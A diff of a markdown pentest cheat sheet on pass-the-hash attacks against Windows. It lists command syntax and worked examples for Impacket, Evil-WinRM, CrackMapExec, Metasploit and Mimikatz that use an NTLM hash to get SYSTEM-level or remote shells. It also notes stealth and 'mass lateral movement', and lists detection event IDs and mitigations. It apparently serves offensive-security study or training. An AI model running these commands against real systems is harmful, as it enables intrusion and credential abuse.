@@ -27,17 +27,41 @@
 
 ---
 
-#### **Example: Impacket’s `wmiexec`**  
-```bash
-# Syntax:
-impacket-wmiexec -hashes <LM_HASH:NT_HASH> <USER>@<TARGET_IP>
+### **Tools & Commands**  
+| **Tool**               | **Command Syntax**                                                                 |  
+|-------------------------|-----------------------------------------------------------------------------------|  
+| **Impacket (psexec)**   | `impacket-psexec -hashes <LM:NT> <USER>@<TARGET_IP>`                              |  
+| **Impacket (wmiexec)**  | `impacket-wmiexec -hashes <LM:NT> <USER>@<TARGET_IP>`                             |  
+| **Evil-WinRM**          | `evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>`                              |  
+| **CrackMapExec**        | `crackmapexec smb <TARGET_IP> -u <USER> -H <NTLM_HASH> -x "<COMMAND>"`            |  
+| **Metasploit (PsExec)** | `use exploit/windows/smb/psexec` + set `SMBPass` (NTLM hash)                      |  
+| **Mimikatz**            | `sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:<COMMAND>`    |  
 
-# Example (local admin):
-impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+---
+
+#### **Examples**  
+**1. Impacket’s wmiexec**:  
+```bash  
+impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73  
 ```  
-- **Output**: Semi-interactive shell with SYSTEM/local admin privileges.  
-- **Use Case**: Execute commands, dump credentials, or pivot to other hosts.  
+- **Result**: Semi-interactive shell via WMI.  
+**2. Impacket’s psexec**:  
+```bash  
+impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.139.72  
+```  
+- **Result**: Spawns a SYSTEM-level shell via SMB.  
 
+**3. Evil-WinRM**:  
+```bash  
+evil-winrm -i 192.168.139.72 -u Administrator -H "2892D26CDF84D7A70E2EB3B9F05C425E"  
+```  
+- **Result**: Interactive WinRM shell (requires WinRM enabled on target).  
+
+**4. CrackMapExec**:  
+```bash  
+crackmapexec smb 192.168.139.72 -u Administrator -H "2892D26CDF84D7A70E2EB3B9F05C425E" -x "whoami"  
+```  
+- **Result**: Executes `whoami` on the target and returns output.  
 ---
 
 ### **Key Notes**  
@@ -46,18 +70,25 @@ impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168
    - Blocked for non-built-in local admin accounts (post-2014 patches).  
 
 2. **Stealth**:  
-   - Triggers **Event ID 4624** (Logon Type 3) and **Event ID 4688** (Process Creation).  
-   - Use proxying/pivoting to avoid direct exposure.  
+   - **Impacket**: Leaves traces in Windows Event Logs (e.g., `Event ID 4688`).  
+   - **CrackMapExec**: Ideal for mass lateral movement and reconnaissance.  
+   - **Evil-WinRM**: Requires WinRM (5985/5986) access and valid credentials.  
 
 ---
 
 ### **Detection & Mitigation**  
 **Detection**:  
-- Monitor for **NTLM authentication** (Event ID 4776) from unexpected users.  
-- Alert on SMB connections to ADMIN$ share from non-admin workstations.  
+- **SMB**: Monitor for `Event ID 4624` (Logon Type 3) and `Event ID 5140` (Network Share Access).  
+- **WinRM**: Check `Event ID 4688` (Process Creation) for `evil-winrm` or PowerShell remoting.  
 
 **Mitigation**:  
 - Disable NTLM (enforce **Kerberos**).  
-- Use **Local Administrator Password Solution (LAPS)** for unique local admin passwords.  
-- Restrict SMB (port 445) and disable File/Printer Sharing if unused.  
-- Enable **Protected Users** group to block NTLM caching.  
+- Use **LAPS** for unique local admin passwords.  
+- Block unnecessary SMB/WinRM traffic.  
+
+---
+
+### **References**  
+- [Impacket Tools](https://github.com/fortra/impacket)  
+- [Evil-WinRM Guide](https://github.com/Hackplayers/evil-winrm)  
+- [CrackMapExec Wiki](https://wiki.porchetta.industries/)  
